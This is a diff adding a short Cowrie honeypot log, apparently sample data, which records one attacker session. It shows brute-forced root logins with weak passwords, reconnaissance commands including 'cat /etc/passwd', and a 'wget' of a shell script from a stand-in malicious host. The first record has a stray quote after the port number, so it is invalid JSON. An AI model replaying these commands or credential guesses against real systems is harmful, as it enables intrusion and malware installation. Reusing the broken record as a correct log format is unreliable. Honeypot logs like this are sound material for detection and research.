@@ -1,0 +1,8 @@
+{"eventid":"cowrie.session.connect","src_ip":"192.168.1.100","src_port":54321,"dst_ip":"10.0.0.1","dst_port":2222","session":"abc123","timestamp":"2026-07-22T14:22:31.123456Z","message":"New connection"}
+{"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:32.123456Z","username":"root","password":"123456","message":"login attempt failed"}
+{"eventid":"cowrie.login.failed","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:33.123456Z","username":"root","password":"password","message":"login attempt failed"}
+{"eventid":"cowrie.login.success","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:34.123456Z","username":"root","password":"admin123","message":"login attempt succeeded"}
+{"eventid":"cowrie.command.input","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:35.123456Z","input":"whoami","message":"CMD: whoami"}
+{"eventid":"cowrie.command.input","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:36.123456Z","input":"cat /etc/passwd","message":"CMD: cat /etc/passwd"}
+{"eventid":"cowrie.command.input","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:37.123456Z","input":"wget http://malicious-site.com/malware.sh","message":"CMD: wget"}
+{"eventid":"cowrie.session.closed","src_ip":"192.168.1.100","session":"abc123","timestamp":"2026-07-22T14:22:38.123456Z","message":"Connection lost"}
